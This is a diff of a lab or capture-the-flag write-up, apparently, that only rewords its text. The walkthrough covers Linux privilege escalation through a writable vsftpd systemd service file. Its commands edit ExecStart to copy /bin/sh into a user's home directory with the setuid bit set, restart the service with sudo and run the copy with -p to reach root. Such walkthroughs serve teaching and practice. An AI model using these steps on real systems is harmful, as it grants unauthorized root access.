@@ -144,9 +144,9 @@ find / -type f -name vsftpd.service 2>/dev/null
 
 ![image](https://user-images.githubusercontent.com/76821053/144726864-387bf518-410e-4b27-ae83-8249b95a7c51.png)
 
-We have found our privesc, and to to so we need to edit the contents of the file. 
+We have found our privesc, and to exploit it we need to edit the contents of the file. 
 
-If we change the ExecStart field we can tell the service to create a copy of the /bin/sh binary to “drac” home directory and set Setuid bit to it:
+We can change the "ExecStart=" field and tell the service to create a copy of the /bin/sh binary to “drac” home directory and set Setuid bit to it:
 
 ```
 /bin/bash -c 'cp /bin/sh /home/drac/sh | chmod u+s /home/drac/sh'
@@ -154,7 +154,7 @@ If we change the ExecStart field we can tell the service to create a copy of the
 
 ![image](https://user-images.githubusercontent.com/76821053/144726870-f430959c-14a3-44fc-8c84-8f630637428a.png)
 
-To trigger this privilege escalation we just need to run:
+To trigger this vulnerability we just need to run:
 
 ```
 sudo /usr/sbin/service vstpd restart
@@ -164,7 +164,7 @@ The vsftpd service will restart and run our commands:
 
 ![image](https://user-images.githubusercontent.com/76821053/144726876-4260d954-8670-46dd-b69f-30dd93a9d3be.png)
 
-Success, if worked! Just run the “sh” binary with -p for persistence and we will get to “root”.
+Success, it worked! Just run the “sh” binary with "-p" for persistence and you will get to “root”.
 
 ```
 ./sh -p
